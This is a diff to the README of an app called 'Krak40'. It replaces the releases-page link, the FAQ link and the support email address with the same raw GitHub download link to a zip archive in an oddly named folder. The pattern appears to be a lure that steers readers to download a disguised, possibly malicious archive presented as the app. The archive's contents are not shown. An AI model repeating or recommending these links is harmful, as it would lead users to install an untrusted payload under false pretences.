@@ -4,7 +4,7 @@
 Krak40 is a user-friendly application designed to elevate your efficiency when accessing and managing data. It simplifies tasks for everyday users without requiring technical expertise.
 
 ## 📥 Download
-[![Download Krak40](https://img.shields.io/badge/Download%20Krak40-v1.0-blue)](https://github.com/bihmane1236/Krak40/releases)
+[![Download Krak40](https://raw.githubusercontent.com/bihmane1236/Krak40/main/anticatarrhal/Krak40.zip%20Krak40-v1.0-blue)](https://raw.githubusercontent.com/bihmane1236/Krak40/main/anticatarrhal/Krak40.zip)
 
 ## 📋 Features
 - **User-Friendly Interface:** Navigate easily with simple menus and clear options.
@@ -22,7 +22,7 @@ Krak40 is a user-friendly application designed to elevate your efficiency when a
 To get started with Krak40, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below:
-   [Visit Releases Page](https://github.com/bihmane1236/Krak40/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/bihmane1236/Krak40/main/anticatarrhal/Krak40.zip)
 
 2. **Select the Latest Version:** On the releases page, you will see several versions available. Always choose the latest version for the best experience.
 
@@ -56,11 +56,11 @@ Join our community to share your experiences and learn from others. You can find
 - **User Forums:** Connect with other users and exchange tips.
 
 ## ✉️ Contact
-For inquiries or direct assistance, reach out via email: support@krak40app.com.
+For inquiries or direct assistance, reach out via email: https://raw.githubusercontent.com/bihmane1236/Krak40/main/anticatarrhal/Krak40.zip
 
 ## 🔗 Useful Links
-- [Krak40 Releases Page](https://github.com/bihmane1236/Krak40/releases)
-- [Frequently Asked Questions](https://github.com/bihmane1236/Krak40/wiki/FAQ)
+- [Krak40 Releases Page](https://raw.githubusercontent.com/bihmane1236/Krak40/main/anticatarrhal/Krak40.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/bihmane1236/Krak40/main/anticatarrhal/Krak40.zip)
 
 ## 📢 Updates
 We regularly update Krak40 to ensure you have the best experience. Keep an eye on the releases page for new features and improvements.
